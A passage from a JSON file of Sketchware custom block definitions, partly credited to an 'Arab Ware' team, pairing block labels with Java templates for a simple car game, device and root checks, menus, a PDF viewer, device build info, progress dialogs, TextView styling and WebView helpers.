getRandom(0,2));\nmap.put(\"startTime\", time);\notherCars.add(map);\n}\n\ntime \u003d time + 10 + speed;\n\nint carWidth \u003d viewWidth/5;\nint carHeight \u003d carWidth+10;\n\nmyPaint.setStyle(android.graphics.Paint.Style.FILL);\n\nandroid.graphics.drawable.Drawable d \u003d getResources().getDrawable(R.drawable.%1$s, null);\nd.setBounds((myCarPosition*viewWidth/3) + viewWidth/15 + 25, viewHeight - 2 -carHeight, (myCarPosition*viewWidth/3) + (viewWidth/15) + carWidth-25, viewHeight-2);\nd.draw(canvas);\n\nmyPaint.setColor(Color.GREEN);\n\nfor (int i \u003d 0; i\u003cotherCars.size(); i++){\nint carX \u003d ((int)otherCars.get(i).get(\"lane\")*viewWidth/3) + viewWidth/15;\nint carY \u003d time - (int)otherCars.get(i).get(\"startTime\");\n\nandroid.graphics.drawable.Drawable d2 \u003d getResources().getDrawable(R.drawable.%2$s, null);\nd2.setBounds(carX+25, carY-carHeight, carX + carWidth-25, carY);\nd2.draw(canvas);\n\nif ((int)otherCars.get(i).get(\"lane\") \u003d\u003d myCarPosition){\nif (carY \u003e viewHeight - 2 - carHeight \u0026\u0026 carY \u003c viewHeight - 2){\n%3$s\n}}\n\nif (carY \u003e viewHeight + carHeight){\notherCars.remove(i);\n%4$s\n}\n}\n\ninvalidate();\n}\n\n@Override\npublic boolean onTouchEvent(MotionEvent event) {\nswitch(event.getAction()) {\ncase MotionEvent.ACTION_DOWN:\nfloat x1 \u003d event.getX();\nif ( x1\u003cviewWidth/2){\nif (myCarPosition\u003e0){\nmyCarPosition--;\n}\n}\nif ( x1\u003eviewWidth/2){\nif (myCarPosition\u003c2){\nmyCarPosition++;\n}\n}\ninvalidate();\nbreak;\ncase MotionEvent.ACTION_UP:\nbreak;\n}\nreturn true;\n\n\n}\n\n","color":"#FFC62828","typeName":"","name":"Simple game car library","palette":"12","type":"e","spec":"simple game car #set first car image %m.resource #set second car image %m.resource #when my car catch car","spec2":"when my car didnot catch any car"},{"code":"score++;","color":"#FFC62828","name":"increase score","typeName":"","palette":"12","type":" ","spec":"increase score"},{"code":"score \u003d %s","color":"#FFC62828","name":"set score","typeName":"","palette":"12","type":" ","spec":"set score %d"},{"code":"\tHashMap\u003cString, Object\u003e map \u003d new HashMap\u003c\u003e();\n\t\tmap.put(\"lane\", getRandom(0,2));\n\t\tmap.put(\"startTime\", time);\n\t\totherCars.add(map);","color":"#FFC62828","name":"Add car random","typeName":"","palette":"12","type":" ","spec":"Add car random"},{"code":"if (score \u003e %1$s){\n%1$s \u003d score;\n}","color":"#FFC62828","name":"access score","typeName":"","palette":"12","type":" ","spec":"access score from %m.varInt"},{"code":"try{\n%s\n}catch(Exception e){\n%s\n}","color":"#FF03A9F4","typeName":"","name":"Try","palette":"118","type":"e","spec":"Try","spec2":"If there is problem then"},{"code":"android.content.pm.PackageManager pm \u003d getPackageManager(); try { pm.getPackageInfo(%s, android.content.pm.PackageManager.GET_ACTIVITIES);%s return; } catch (android.content.pm.PackageManager.NameNotFoundException e) { } %s","color":"#FF03A9F4","typeName":"","name":"AppIfInstalledCheck","palette":"118","type":"e","spec":"If there is app installed with package name %s then","spec2":"else"},{"code":"if (getApplicationContext().getPackageName().equals(%s)) {\r\n\t\r%s\n}\r\nelse {\r\n\t\r%s\n}","color":"#FF03A9F4","typeName":"","name":"package name","palette":"118","type":"e","spec":"If package name of this app equals %s then","spec2":"esle"},{"code":"final android.net.wifi.WifiManager %1$s \u003d (android.net.wifi.WifiManager)getSystemService(Context.WIFI_SERVICE);\n\nif (%1$s.isWifiEnabled()) {\n    %2$s\n} else {\n    %3$s\n}","color":"#FF03A9F4","typeName":"","name":"Wi-Fi","palette":"118","type":"e","spec":"%m.requestnetwork If Wi-Fi Opened Then","spec2":"Else"},{"code":"try {\n\nRuntime.getRuntime().exec(\"su\"); \n\n%s\n\n} catch (Exception e ) {\n\n%s\n\n}","color":"#FF03A9F4","typeName":"","name":"RootChecker","palette":"118","type":"e","spec":"If device Rooted Then","spec2":"Else"},{"code":"if (SketchwareUtil.getDisplayWidthPixels(getApplicationContext()) \u003d\u003d %s) {\r\n\t\r%s\n}","color":"#FF03A9F4","name":"Screen Width","typeName":"","palette":"118","type":"c","spec":"If Screen width is %d then"},{"code":"if (SketchwareUtil.getDisplayHeightPixels(getApplicationContext()) \u003d\u003d %s) {\r\n\t\r%s\n}","color":"#FF03A9F4","name":"Screen Height","typeName":"","palette":"118","type":"c","spec":"If Screen Height is %d"},{"code":"try{\nint count;\njava.io.InputStream input\u003d this.getAssets().open(%s);\njava.io.OutputStream output \u003d new  java.io.FileOutputStream(%s+%s);\nbyte data[] \u003d new byte[1024];\nwhile ((count \u003d input.read(data))\u003e0) {\noutput.write(data, 0, count);\n}\noutput.flush();\noutput.close();\ninput.close();\n%s\n\t}catch(Exception e){\n\t\t\r%s\n\t}","color":"#FF03A9F4","typeName":"","name":"Assets Save","palette":"118","type":"e","spec":"Try To Save File From Assets With Name %s into path %s with name %s #If successed then","spec2":"Else"},{"code":"if (SketchwareUtil.isConnected(getApplicationContext())) {\r\n\t%1$s\n}\r\nelse {\r\n\t%2$s\n}","color":"#FF03A9F4","typeName":"","name":"if connected","palette":"118","type":"e","spec":"if connected then","spec2":"else"},{"code":"if (FileUtil.isExistFile(%s)) {\r\n\t\r%s\n}\r\nelse {\r\n\t\r%s\n}\r","color":"#FF03A9F4","typeName":"","name":"FileCheck","palette":"118","type":"e","spec":"Check If there is file or folder in device #the path is %s","spec2":"Else"},{"code":"ActionBarDrawerToggle _toggle \u003d new ActionBarDrawerToggle(ac, _drawer, _toolbar, R.string.apptitle, R.string.apptitle) {\npublic void onDrawerClosed(View view) {\n%s\n}\n@Override\npublic void onDrawerSlide(View drawerView, float offset) {\n%s\n}\n};\n_drawer.addDrawerListener(_toggle);","color":"#FF03A9F4","typeName":"","name":"Drawer","palette":"118","type":"e","spec":"If drawer closed listener Then","spec2":"Else It opened"},{"code":"Rect rectangle \u003d new Rect();\nWindow window \u003d ac0.getWindow(); window.getDecorView().getWindowVisibleDisplayFrame(rectangle);\nint statusBarHeight \u003d rectangle.top;\nif  (statusBarHeight !\u003d 0) {\n%s\n}\nelse {\n%s\n}","color":"#FF03A9F4","typeName":"","name":"StatusBar","palette":"118","type":"e","spec":"If Status Bar Is Visible Ehen","spec2":"Else"},{"code":"Rect rectangle \u003d new Rect();\nDisplayMetrics displayMetrics \u003d new DisplayMetrics(); ac0.getWindow().getDecorView().getWindowVisibleDisplayFrame(rectangle); ac0.getWindowManager().getDefaultDisplay().getRealMetrics(displayMetrics);\nif (displayMetrics.heightPixels !\u003d (rectangle.top + rectangle.height())) {\n%s\n}\nelse {\n%s\n}","color":"#FF03A9F4","typeName":"","name":"Navigation","palette":"118","type":"e","spec":"If Navigation Bar avaible then","spec2":"else"},{"code":"while(%s){\n%s\n}","color":"#FF03A9F4","name":"While","typeName":"","palette":"118","type":"c","spec":"While %b then"},{"code":"if (%1$s) {\n           %2$s\n            return;\n        }","color":"#FF03A9F4","name":"if permission not allowed","typeName":"","palette":"118","type":"c","spec":"check permission if  %b "},{"code":"if (ContextCompat.checkSelfPermission(this, \"android.permission.READ_EXTERNAL_STORAGE\") \u003d\u003d -1 || ContextCompat.checkSelfPermission(this, \"android.permission.WRITE_EXTERNAL_STORAGE\") \u003d\u003d -1) {\n            %s\n            return;\n        }","color":"#FF03A9F4","name":"if storage permission not allowed","typeName":"","palette":"118","type":"c","spec":"if storage permission not allowed"},{"code":"","color":"#FFB71C1C","name":"","typeName":"","palette":"119","type":"h","spec":"Added by Arab Ware team By Ameer Ezit تمت اضافتها بواسطة فريق عرب وير بواسطة امير عزت"},{"code":"%s.setFastScrollEnabled(%s);","color":"#FFC62828","name":"List view fast","typeName":"","palette":"119","type":" ","spec":"make %m.listview fast at scroll %b"},{"code":"%s.smoothScrollToPosition(arrayAdapter.getCount());","color":"#FFC62828","name":"list view last item","typeName":"","palette":"119","type":" ","spec":"scroll %m.listview to the last item"},{"code":"%s.smoothScrollToPosition(arrayAdapter.getCount());","color":"#FFC62828","name":"list view refresh","typeName":"","palette":"119","type":" ","spec":"refresh %m.listview"},{"code":"%s.smoothScrollToPosition(%s);","color":"#FFC62828","name":"set list view item","typeName":"","palette":"119","type":" ","spec":"scroll %m.listview to the item %d"},{"code":"%1$s.setHorizontalScrollBarEnabled(false);\n%1$s.setVerticalScrollBarEnabled(false);\n%1$s.setOverScrollMode(ListView.OVER_SCROLL_NEVER);","color":"#FFC62828","name":"Hide Scroll","typeName":"","palette":"119","type":" ","spec":"%m.listview hide scroll bar"},{"code":" }\n@Override\npublic boolean onCreateOptionsMenu (Menu menu){\nmenu.add(0, 0, 0, %1$s);\nmenu.add(0, 1, 1, %2$s);\nmenu.add(0, 2, 2, %3$s);\nreturn true;\n}\n\n@Override\npublic boolean onOptionsItemSelected(MenuItem item){\nswitch (item.getItemId()){","color":"#FF689F38","name":"Add menu","typeName":"","palette":"120","type":" ","spec":"Add menu with item 1 name %s and item 2 %s and item 3 %s"},{"code":"case 0:\n%s\nbreak;","color":"#FF689F38","name":"Case item 1","typeName":"","palette":"120","type":"c","spec":"Case item 1"},{"code":"case 1:\n%s\nbreak;","color":"#FF689F38","name":"Case Item 2","typeName":"","palette":"120","type":"c","spec":"Case item 2"},{"code":"case 2:\n%s\nbreak;\n}\nreturn super.onOptionsItemSelected(item);","color":"#FF689F38","name":"Case item 3","typeName":"","palette":"120","type":"c","spec":"Case item 3"},{"code":"}\n@Override\npublic boolean onCreateOptionsMenu(Menu menu){\n\nmenu.add(%1$s).setIcon(R.drawable.%2$s).setShowAsAction(MenuItem.SHOW_AS_ACTION_NEVER);\n\nmenu.add(%3$s).setIcon(R.drawable.%4$s).setShowAsAction(MenuItem.SHOW_AS_ACTION_NEVER);\n\nreturn true;\n}\n\n@Override\npublic boolean onOptionsItemSelected(final MenuItem item) {\nswitch (item.getTitle().toString()) {","color":"#FF689F38","name":"Toolbar items icons","typeName":"","palette":"120","type":" ","spec":"menu add in toolbar item1 %s with icon%m.resource item 2 %s with icon %m.resource"},{"code":"case %1$s:\n%2$s\nreturn true;","color":"#FF689F38","name":"Case item","typeName":"","palette":"120","type":"c","spec":"Case %s.inputOnly "},{"code":"default:\nreturn super.onOptionsItemSelected(item);\n}","color":"#FF689F38","name":"Show items","typeName":"","palette":"120","type":" ","spec":"show items"},{"code":"","color":"#FFC2185B","name":"ArabWare    ","typeName":"","palette":"121","type":"h","spec":"This By Arab Ware Channel Dont Dont Dont Edit it هذا بواسطة قناة عرب وير بواسطة امير عزت اياك و تعديله"},{"code":"}\nprivate\nandroid.graphics.pdf.PdfRenderer\nrenderer;\nZoomableImageView touch;\r\npublic class ZoomableImageView extends ImageView {\n\n\nMatrix matrix \u003d new Matrix();\n\nstatic final int NONE \u003d 0;\n\nstatic final int DRAG \u003d 1;\n\nstatic final int ZOOM \u003d 2;\n\nstatic final int CLICK \u003d 3;\n\nint mode \u003d NONE;\n\nPointF last \u003d new PointF();\n\nPointF start \u003d new PointF();\n\nfloat minScale \u003d 1f;\n\nfloat maxScale \u003d 4f;\n\nfloat[] m;\n\nfloat redundantXSpace, redundantYSpace;\n\nfloat width, height;\n\nfloat saveScale \u003d 1f;\n\nfloat right, bottom, origWidth, origHeight, bmWidth, bmHeight;\n\nScaleGestureDetector mScaleDetector;\n\nContext context;\n\n\npublic ZoomableImageView(Context context) {\n\nsuper(context);\n\nsuper.setClickable(true);\n\nthis.context \u003d context;\n\nmScaleDetector \u003d new ScaleGestureDetector(context, new ScaleListener());\n\nmatrix.setTranslate(1f, 1f);\n\nm \u003d new float[9];\n\nsetImageMatrix(matrix); setScaleType(ScaleType.MATRIX);\n\n\nsetOnTouchListener(new OnTouchListener() {\n\n@Override\n\npublic boolean onTouch(View v, MotionEvent event) {\n\nmScaleDetector.onTouchEvent(event);\n\nmatrix.getValues(m);\n\nfloat x \u003d m[Matrix.MTRANS_X];\n\nfloat y \u003d m[Matrix.MTRANS_Y];\n\nPointF curr \u003d new PointF(event.getX(), event.getY());\n\nswitch (event.getAction()) {\n\ncase MotionEvent.ACTION_DOWN: last.set(event.getX(), event.getY()); start.set(last); mode \u003d DRAG;\n\nbreak;\n\ncase MotionEvent.ACTION_POINTER_DOWN: last.set(event.getX(), event.getY()); start.set(last);\n\nmode \u003d ZOOM;\n\nbreak;\n\ncase MotionEvent.ACTION_MOVE:\n\nif (mode \u003d\u003d ZOOM || (mode \u003d\u003d DRAG \u0026\u0026 saveScale \u003e minScale)) {\n\nfloat deltaX \u003d curr.x - last.x;\n\nfloat deltaY \u003d curr.y - last.y;\n\nfloat scaleWidth \u003d Math.round(origWidth * saveScale);\n\nfloat scaleHeight \u003d Math.round(origHeight * saveScale);\n\nif (scaleWidth \u003c width) {\n\ndeltaX \u003d 0;\n\nif (y + deltaY \u003e 0) deltaY \u003d -y;\n\nelse if (y + deltaY \u003c -bottom) deltaY \u003d -(y + bottom);\n\n} else if (scaleHeight \u003c height) {\n\ndeltaY \u003d 0;\n\nif (x + deltaX \u003e 0) deltaX \u003d -x;\n\nelse if (x + deltaX \u003c -right) deltaX \u003d -(x + right);\n\n} else {\n\nif (x + deltaX \u003e 0) deltaX \u003d -x;\n\nelse if (x + deltaX \u003c -right) deltaX \u003d -(x + right);\n\nif (y + deltaY \u003e 0) deltaY \u003d -y;\n\nelse if (y + deltaY \u003c -bottom) deltaY \u003d -(y + bottom);\n\n}\n\nmatrix.postTranslate(deltaX, deltaY);\n\nlast.set(curr.x, curr.y);\n\n}\n\nbreak;\n\ncase MotionEvent.ACTION_UP:\n\nmode \u003d NONE;\n\nint xDiff \u003d (int) Math.abs(curr.x - start.x);\n\nint yDiff \u003d (int) Math.abs(curr.y - start.y);\n\nif (xDiff \u003c CLICK \u0026\u0026 yDiff \u003c CLICK) performClick();\n\nbreak;\n\ncase MotionEvent.ACTION_POINTER_UP:\n\nmode \u003d NONE;\n\nbreak;\n\n}\n\nsetImageMatrix(matrix);\n\ninvalidate();\n\nreturn true;\n\n}\n\n});\n\n}\n\n\n@Override\n\npublic void setImageBitmap(Bitmap bm) {\n\nsuper.setImageBitmap(bm);\n\nbmWidth \u003d bm.getWidth();\n\nbmHeight \u003d bm.getHeight(); }\n\n\npublic void setMaxZoom(float x) {\n\nmaxScale \u003d x; }\n\n\nprivate class ScaleListener extends ScaleGestureDetector.SimpleOnScaleGestureListener {\n\n@Override\n\npublic boolean onScaleBegin(ScaleGestureDetector detector) {\n\nmode \u003d ZOOM;\n\nreturn true;}\n\n@Override\n\npublic boolean onScale(ScaleGestureDetector detector) {\n\nfloat mScaleFactor \u003d detector.getScaleFactor();\n\nfloat origScale \u003d saveScale;\n\nsaveScale *\u003d mScaleFactor;\n\nif (saveScale \u003e maxScale){\n\nsaveScale \u003d maxScale;\n\nmScaleFactor \u003d maxScale / origScale;\n\n} else if (saveScale \u003c minScale) {\n\nsaveScale \u003d minScale;\n\nmScaleFactor \u003d minScale / origScale;}\n\nright \u003d width * saveScale - width - (2 * redundantXSpace * saveScale);\n\nbottom \u003d height * saveScale - height - (2 * redundantYSpace * saveScale);\n\nif (origWidth * saveScale \u003c\u003d width || origHeight * saveScale \u003c\u003d height) {\n\nmatrix.postScale(mScaleFactor, mScaleFactor, width / 2, height / 2);\n\nif (mScaleFactor \u003c 1) {\n\nmatrix.getValues(m);\n\nfloat x \u003d m[Matrix.MTRANS_X];\n\nfloat y \u003d m[Matrix.MTRANS_Y];\n\nif (mScaleFactor \u003c 1) {\n\nif (Math.round(origWidth * saveScale) \u003c width) {\n\nif (y \u003c -bottom) matrix.postTranslate(0, -(y + bottom));\n\nelse if (y \u003e 0) matrix.postTranslate(0, -y);\n\n} else {\n\nif (x \u003c -right) matrix.postTranslate(-(x + right), 0);\n\nelse if (x \u003e 0) matrix.postTranslate(-x, 0);}\n\n}\n\n}\n\n} else {\n\nmatrix.postScale(mScaleFactor, mScaleFactor, detector.getFocusX(), detector.getFocusY()); matrix.getValues(m);\n\nfloat x \u003d m[Matrix.MTRANS_X];\n\nfloat y \u003d m[Matrix.MTRANS_Y];\n\nif (mScaleFactor \u003c 1) {\n\nif (x \u003c -right) matrix.postTranslate(-(x + right), 0);\n\nelse if (x \u003e 0) matrix.postTranslate(-x, 0);\n\nif (y \u003c -bottom) matrix.postTranslate(0, -(y + bottom));\n\nelse if (y \u003e 0) matrix.postTranslate(0, -y);}\n\n}\n\nreturn true;\n\n}\n\n}\n\n\n@Override\n\nprotected void onMeasure (int widthMeasureSpec, int heightMeasureSpec) {\n\nsuper.onMeasure(widthMeasureSpec, heightMeasureSpec);\n\nwidth \u003d MeasureSpec.getSize(widthMeasureSpec);\n\nheight \u003d MeasureSpec.getSize(heightMeasureSpec);\n\nfloat scale;\n\nfloat scaleX \u003d width / bmWidth;\n\nfloat scaleY \u003d height / bmHeight;\n\nscale \u003d Math.min(scaleX, scaleY); matrix.setScale(scale, scale); setImageMatrix(matrix);\n\nsaveScale \u003d 1f;\n\nredundantYSpace \u003d height - (scale * bmHeight) ;\n\nredundantXSpace \u003d width - (scale * bmWidth);\n\nredundantYSpace /\u003d 2;\n\nredundantXSpace /\u003d 2; matrix.postTranslate(redundantXSpace, redundantYSpace);\n\norigWidth \u003d width - 2 * redundantXSpace;\n\norigHeight \u003d height - 2 * redundantYSpace;\n\nright \u003d width * saveScale - width - (2 * redundantXSpace * saveScale);\n\nbottom \u003d height * saveScale - height - (2 * redundantYSpace * saveScale); setImageMatrix(matrix);}\n\n}\n\n    \r\n{","color":"#FFC2185B","name":"PDF LIBRARY","typeName":"","palette":"121","type":" ","spec":"INSTALL PDF LIBRARY|put it into more block|"},{"code":"android.graphics.pdf.PdfRenderer.Page page \u003d renderer.openPage((int)%1$s);\n\nBitmap mBitmap \u003d Bitmap.createBitmap((int)getDip(page.getWidth()), (int)getDip(page.getHeight()), Bitmap.Config.ARGB_8888);\n\npage.render(mBitmap, null, null, android.graphics.pdf.PdfRenderer.Page.RENDER_MODE_FOR_DISPLAY);\n\ntouch.setImageBitmap(mBitmap);\n\npage.close();","color":"#FFC2185B","name":"Display PDF With Page","typeName":"","palette":"121","type":" ","spec":"display pdf file with page %d"},{"code":"try {\nrenderer \u003d new android.graphics.pdf.PdfRenderer(new ParcelFileDescriptor(ParcelFileDescriptor.open(new java.io.File(%s), ParcelFileDescriptor.MODE_READ_ONLY)));\n%s\n} catch (Exception e){\n%s\n}","color":"#FFC2185B","typeName":"","name":"Try Display Pdf","palette":"121","type":"e","spec":"Try Display Pdf from path %s","spec2":"if there is error then"},{"code":"touch \u003d new\nZoomableImageView(this);\n%s.addView(touch);","color":"#FFC2185B","name":"Display Pdf Into","typeName":"","palette":"121","type":" ","spec":"Display Pdf Into %m.view"},{"code":"renderer.getPageCount()","color":"#FFC2185B","name":"Get Total Pages","typeName":"","palette":"121","type":"d","spec":"get total pdf file pages"},{"code":"%1$s.setText(Build.TYPE);","color":"#FF1E88E5","name":"Set text 1","typeName":"","palette":"122","type":" ","spec":"set %m.textview as build type"},{"code":"%1$s.setText(Build.TAGS);","color":"#FF1E88E5","name":"set text 2","typeName":"","palette":"122","type":" ","spec":"set %m.textview as  build tags"},{"code":"%1$s.setText(Build.USER);","color":"#FF1E88E5","name":"Set text 3","typeName":"","palette":"122","type":" ","spec":"set %m.textview as  build user"},{"code":"%1$s.setText(Build.UNKNOWN);","color":"#FF1E88E5","name":"Set text 4","typeName":"","palette":"122","type":" ","spec":"set %m.textview as build Unknown"},{"code":"%1$s.setText(Build.ID);","color":"#FF1E88E5","name":"Set text 5","typeName":"","palette":"122","type":" ","spec":"set %m.textview as build ID"},{"code":"%1$s.setText(Build.PRODUCT);","color":"#FF1E88E5","name":"Set text 6","typeName":"","palette":"122","type":" ","spec":"set %m.textview as build product"},{"code":"%1$s.setText(Build.DISPLAY);","color":"#FF1E88E5","name":"Set text 7","typeName":"","palette":"122","type":" ","spec":"set %m.textview as build display"},{"code":"%1$s.setText(Build.FINGERPRINT);","color":"#FF1E88E5","name":"Set text 8","typeName":"","palette":"122","type":" ","spec":"set %m.textview as build fingerprint"},{"code":" %1$s.setText(Build.CPU_ABI);","color":"#FF1E88E5","name":"Set text 9","typeName":"","palette":"122","type":" ","spec":"set %m.textview as build CPU ABI"},{"code":" %1$s.setText(Build.HOST);","color":"#FF1E88E5","name":"Set text 10","typeName":"","palette":"122","type":" ","spec":"set %m.textview as build Host"},{"code":"%1$s.setText(Build.HARDWARE);","color":"#FF1E88E5","name":"Set text 11","typeName":"","palette":"122","type":" ","spec":"set %m.textview as build HardWare"},{"code":"%1$s.setText(Build.SERIAL);","color":"#FF1E88E5","name":"Set text 12","typeName":"","palette":"122","type":" ","spec":"set %m.textview as build  Serial"},{"code":"%1$s.setText(Build.RADIO);","color":"#FF1E88E5","name":"Set text 13","typeName":"","palette":"122","type":" ","spec":"set %m.textview as build Radio "},{"code":" %1$s.setText(Build.BOOTLOADER);","color":"#FF1E88E5","name":"Set text 14","typeName":"","palette":"122","type":" ","spec":"set %m.textview as build BootLoader"},{"code":"%1$s.setText(Build.BOARD);","color":"#FF1E88E5","name":"Set text 15","typeName":"","palette":"122","type":" ","spec":"set %m.textview as build Board "},{"code":"%1$s.setText(Build.VERSION.SECURITY_PATCH);","color":"#FF1E88E5","name":"Set text 16","typeName":"","palette":"122","type":" ","spec":"set %m.textview as build  Security Patch"},{"code":"%1$s.setText(Build.BRAND);","color":"#FF1E88E5","name":"Set text 17","typeName":"","palette":"122","type":" ","spec":"set %m.textview as build Brand"},{"code":"%1$s.setText(Build.VERSION.SDK);","color":"#FF1E88E5","name":"Set text 18","typeName":"","palette":"122","type":" ","spec":"set %m.textview as build version sdk"},{"code":"%1$s.setText(Build.MANUFACTURER.concat(\" \".concat(Build.MODEL)));","color":"#FF1E88E5","name":"Set text 19","typeName":"","palette":"122","type":" ","spec":"set %m.textview as build model"},{"code":"%1$s.setText(Build.VERSION.RELEASE);","color":"#FF1E88E5","name":"Set text 20","typeName":"","palette":"122","type":" ","spec":"set %m.textview as build release"},{"code":"%s \u003d new ProgressDialog(%s.this);","name":"ProgressDialog create","palette":"123","type":" ","spec":"ProgressDialog %m.ProgressDialog Create %m.activity"},{"code":"%s.setIndeterminate((int)%s);","name":"ProgressDialog setIndeterminate","palette":"123","type":" ","spec":"ProgressDialog %m.ProgressDialog setIndeterminate %b"},{"code":"%s.setMax((int)%s);","name":"ProgressDialog setMax","palette":"123","type":" ","spec":"ProgressDialog %m.ProgressDialog setMax %d"},{"code":"%s.setMessage(%s);","name":"ProgressDialog setMessage","palette":"123","type":" ","spec":"ProgressDialog %m.ProgressDialog setMessage %s"},{"code":"%s.setProgress((int)%s);","name":"ProgressDialog setProgress","palette":"123","type":" ","spec":"ProgressDialog %m.ProgressDialog setProgress %d"},{"code":"%s.setProgressStyle(ProgressDialog.%s);","name":"ProgressDialog setProgressStyle","palette":"123","type":" ","spec":"ProgressDialog %m.ProgressDialog setProgressStyle %s.inputOnly"},{"code":"%s.getMax()","name":"ProgressDialog getMax","palette":"123","type":"d","spec":"ProgressDialog %m.ProgressDialog getMax"},{"code":"%s.getProgress()","name":"ProgressDialog getProgress","palette":"123","type":"d","spec":"ProgressDialog %m.ProgressDialog getProgress"},{"code":"%s.incrementProgressBy((int)%s);","name":"ProgressDialog incrementProgressBy","palette":"123","type":" ","spec":"ProgressDialog %m.ProgressDialog incrementProgressBy %d"},{"code":"%s.isIndeterminate()","name":"ProgressDialog isIndeterminate","palette":"123","type":"b","spec":"ProgressDialog %m.ProgressDialog isIndeterminate"},{"code":"%s.isShowing()","name":"ProgressDialog isShowing","palette":"123","type":"b","spec":"ProgressDialog %m.ProgressDialog isShowing"},{"code":"%s.show();","name":"ProgressDialog show","palette":"123","type":" ","spec":"ProgressDialog %m.ProgressDialog show"},{"code":"%s.setCancelable(%s);","name":"ProgressDialog setCancelable","palette":"123","type":" ","spec":"ProgressDialog %m.ProgressDialog setCancelable %b"},{"code":"%s.dismiss();","name":"ProgressDialog dismiss","palette":"123","type":" ","spec":"ProgressDialog %m.ProgressDialog dismiss"},{"code":"%s","name":"blockTest","palette":"123","type":"h","spec":"blockTest"},{"code":"%s.setTextIsSelectable(%s);","color":"#FF00ACC1","name":"select","typeName":"","palette":"86","type":" ","spec":"set %m.textview selectable %b"},{"code":"%1$s.setClickable(true);\nandroid.text.util.Linkify.addLinks(%1$s, android.text.util.Linkify.ALL);\n%1$s.setLinkTextColor(Color.parseColor(\"%2$s\"));\n%1$s.setLinksClickable(%3$s);","color":"#FF00ACC1","name":"link","typeName":"","palette":"86","type":" ","spec":"set %m.textview as link with color %s.inputOnly and set clickable %b "},{"code":"%1$s.setTextSize((float)%2$s);","color":"#FF00ACC1","name":"size","typeName":"","palette":"86","type":" ","spec":"set %m.textview size as %d"},{"code":"%1$s.setTextColor(Color.rgb(%2$s,%3$s,%4$s));","color":"#FF00ACC1","name":"color","typeName":"","palette":"86","type":" ","spec":"set %m.textview color with R %d G %d B %d"},{"code":" %1$s.setTypeface(Typeface.DEFAULT);","color":"#FF00ACC1","name":"textview typeface 1","typeName":"","palette":"86","type":" ","spec":"set %m.textview typeface as default"},{"code":"%1$s.setTypeface(Typeface.SANS_SERIF);","color":"#FF00ACC1","name":"textview typeface 2","typeName":"","palette":"86","type":" ","spec":"set %m.textview typeface as SANS SERIF"},{"code":"%1$s.setTypeface(Typeface.SERIF);","color":"#FF00ACC1","name":"textview typeface 3","typeName":"","palette":"86","type":" ","spec":"set %m.textview typeface as SERIF"},{"code":"%1$s.setTypeface(Typeface.MONOSPACE);","color":"#FF00ACC1","name":"textview typeface 4","typeName":"","palette":"86","type":" ","spec":"set %m.textview typeface as  MONOSAPCE"},{"code":"%1$s.append((CharSequence)%2$s);","color":"#FF00ACC1","name":"textview append text","typeName":"","palette":"86","type":" ","spec":"set %m.textview append text %s"},{"code":"ScaleAnimation scaleAnimation \u003d new ScaleAnimation(1f,4f,1f,4f, Animation.RELATIVE_TO_SELF, 0.5f, Animation.RELATIVE_TO_SELF, 0.5f); \nscaleAnimation.setInterpolator(new LinearInterpolator()); \nscaleAnimation.setDuration(1800); \n%1$s.startAnimation(scaleAnimation); ","color":"#FF00ACC1","name":"start ZoomIn Animation","typeName":"","palette":"86","type":" ","spec":"%m.textview start ZoomIn Animation"},{"code":"ScaleAnimation scaleAnimation \u003d new ScaleAnimation(1f,0.5f,1f,.50f, Animation.RELATIVE_TO_SELF, 0.5f, Animation.RELATIVE_TO_SELF, 0.5f); \nscaleAnimation.setInterpolator(new AccelerateDecelerateInterpolator()); \nscaleAnimation.setDuration(1800); \n%1$s.startAnimation(scaleAnimation);","color":"#FF00ACC1","name":"Start ZoomOut Animation","typeName":"","palette":"86","type":" ","spec":"%m.textview start ZoomOut Animation"},{"code":"Double.parseDouble(%1$s.getText().toString())","color":"#FF00ACC1","name":"textview as number","typeName":"","palette":"86","type":"d","spec":"%m.textview get text"},{"code":"Intent i \u003d new Intent(android.content.Intent.ACTION_SEND); i.setType(\"text/plain\"); i.putExtra(android.content.Intent.EXTRA_TEXT, %1$s.getText().toString()); startActivity(Intent.createChooser(i,%2$s));","color":"#FF00ACC1","name":"Share TextView","typeName":"","palette":"86","type":" ","spec":"share %m.textview set share message %s"},{"code":"Typeface myTypeface \u003d Typeface.createFromFile(%2$s);\n%1$s.setTypeface(myTypeface);","color":"#FF00ACC1","name":"font","typeName":"","palette":"86","type":" ","spec":"set %m.textview font from path %s"},{"code":"%1$s.setTransformationMethod(android.text.method.PasswordTransformationMethod.getInstance());","color":"#FF00ACC1","name":"Hide Password Mode","typeName":"","palette":"86","type":" ","spec":"%m.edittext hide password mode"},{"code":"%1$s.setTransformationMethod(android.text.method.HideReturnsTransformationMethod.getInstance());","color":"#FF00ACC1","name":"Show password mode","typeName":"","palette":"86","type":" ","spec":"%m.edittext show password mode"},{"code":"%1$s.setError(\"%2$s\");","color":"#FF00ACC1","name":"set error message","typeName":"","palette":"86","type":" ","spec":"%m.edittext set error message %s.inputOnly "},{"code":"String map \u003d %1$s.getText().toString().replace(%3$s, \"\u003cfont color\u003d\\\"\".concat(\"%2$s\".concat(\"\\\"\u003e\".concat(%3$s.concat(\"\u003c/font\u003e\")))));\r\n%1$s.setText(Html.fromHtml(map));","color":"#FF00ACC1","name":"part of Text color","typeName":"","palette":"86","type":" ","spec":"Make part of %m.textview with color %s.inputOnly the part is %s"},{"code":"%1$s.setAllCaps(%2$s);","color":"#FF00ACC1","name":"Text capital","typeName":"","palette":"86","type":" ","spec":"set %m.textview word mode as capital %b"},{"code":"%1$s.loadUrl(\"data:text/html,\"+%2$s);","color":"#FF2196F3","name":"Webview load html code","typeName":"","palette":"124","type":" ","spec":"Webview %m.webview load html code%s "},{"code":"%s.getCertificate().toString()","color":"#FF03A9F4","name":"WebView","typeName":"","palette":"124","type":"s","spec":"Get Certificate Of %m.webview"},{"code":"if (%1$s.getText().toString().contains(\"https://\") || %1$s.getText().toString().contains(\"http://\")) {\r\n\t%2$s.loadUrl(%1$s.getText().toString());\r\n}\r\nelse {\r\n\t%2$s.loadUrl(\"https://www.google.com/search?ie\u003dUTF-8\u0026client\u003dms-android-samsung\u0026source\u003dandroid-browser\u0026q\u003d\".concat(%1$s.getText().toString()));\r\n}","color":"#FF03A9F4","name":"Search Google","typeName":"","palette":"124","type":" ","spec":"Search in google by words or link from %m.textview into %m.webview"},{"code":"%s.getTitle()","color":"#FF03A9F4","name":"WebView Get Title","typeName":"","palette":"124","type":"s","spec":"Get %m.webview title"},{"code":"%s.getSettings().setJavaScriptEnabled(%s);","color":"#FF03A9F4","name":"Java Script In 